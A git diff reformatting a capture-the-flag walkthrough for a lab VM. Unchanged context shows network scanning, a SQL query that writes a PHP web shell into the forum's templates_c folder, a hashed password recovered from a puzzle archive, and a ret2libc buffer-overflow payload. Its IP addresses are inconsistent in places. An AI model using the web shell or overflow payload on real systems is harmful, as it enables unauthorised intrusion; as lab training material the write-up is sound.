@@ -6,7 +6,7 @@ We'll be working on the Kali Linux VM for this exploit. Since we can communicate
 
 First, we need to find the IP address of the other VM. For this task, we'll use the IP address of our local machine *(Kali Linux)* with `netdiscover` to perform the scanning. In our case, the IP is `198.168.144.5`.
 
-```
+```sh
 sudo netdiscover -r 192.168.144.5/24
 ```
 ![alt text](images/netdiscover.png)
@@ -15,11 +15,12 @@ Looking at the result, the IP `192.168.144.6` looks interesting as it's an *Unkn
 
 Now that we have the IP address of the hosted server, we can use `nmap` to scan it and gather more information.
 
-```
+```sh
 nmap -sV -sC 192.168.144.3
 ```
 Result:
-```
+
+```sh
 PORT    STATE SERVICE  VERSION
 21/tcp  open  ftp      vsftpd 2.0.8 or later
 |_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
@@ -52,7 +53,7 @@ PORT    STATE SERVICE  VERSION
 |_ssl-date: 2024-09-13T13:29:38+00:00; -1h42m37s from scanner time.
 Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-We can see that various services are present, but the `http` and `ssl/http` *(https)* services on ports *80* and *443*, respectively, are particularly interesting.
+We can see that various services are present, but the `HTTP` and `SSL/HTTP` *(HTTPS)* services on ports *80* and *443*, respectively, are particularly interesting.
 
 ## Exploring the webserver
 
@@ -65,7 +66,8 @@ http://192.168.144.3
 
 This page loads when we access the address, but there's nothing interesting to do. In this case, we'll use `gobuster` to search for "hidden" directories and files on the server.
 After scanning port 80 *(HTTP)*, we found that all the pages return a 403 status code, indicating they are forbidden. So let's scan port 443 *(HTTPS)* to see if we can find anything interesting.
-``` 
+
+```sh
 sudo gobuster dir -k -u https://192.168.144.3 -w /usr/share/dirb/wordlists/common.txt -x .php -o gobuster.txt
 ```
 ![alt text](images/gobuster.png)
@@ -101,11 +103,13 @@ To begin, we need to create a new database in the *Databases* tab.
 Before making a query, we need to locate a directory where we have permission to create a file. If we look back at the forum, we find that the webserver is running on **My Little Forum**. Let's take a look at the template by checking the [source code](https://github.com/My-Little-Forum/mylittleforum) on GitHub! As we can see, there's a repository named `templates_c` that we can access.
 
 With that information, we go into the newly created database and navigate to the *SQL* tab. In the *SQL* tab, we'll execute the following query to upload a file that will run a shell command:
-```
+
+```SQL
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/backdoor.php"
 ```
 
 Next, we go at the file we just created using the following URL:
+
 ```
 https://192.168.144.3/forum/templates_c/backdoor.php
 ```
@@ -148,10 +152,11 @@ It seems that we need to solve the challenge in *fun* to get access to the user 
 
 To start, we need to know what type of file is `fun` and inspect its content.
 
-```
+```sh
 file fun
 ```
 Result:
+
 ```
 fun: POSIX tar archive (GNU)
 ```
@@ -162,9 +167,10 @@ We find a lot of text, with each line formatted like this:
 ```
 //file616ft_fun/AMH11.pcap0000640000175000001440000000003412563172202012453 0ustar  nnmusers}void useless() {
 ```
+
 The messages resemble C code, and upon closer inspection, we can find the following:
 
-```
+```C
 int main() {
         printf("M");
         printf("Y");
@@ -206,11 +212,12 @@ Example: After **getme6()**, the file number is 521, so we need to find file num
 With all that informations, we can reconstruct the password: `Iheartpwnage`.\
 However, when we try to log in to *laurie* via SSH, it doesn’t work. This suggests the password might be hashed, so let's try hashing it using **SHA-256**!
 
-```
+```sh
 echo -n "Iheartpwnage" | sha256sum
 ```
 
 That gives us the following password:
+
 ```
 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 ```
@@ -362,7 +369,7 @@ Finally, we will construct the payload using all the information we've gathered,
 `Offset + adrress of system + "DUMM" + address of /bin/sh`\
 This gives:
 
-```
+```sh
 ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "DUMM" + "\x58\xcc\xf8\xb7"')
 ```
 
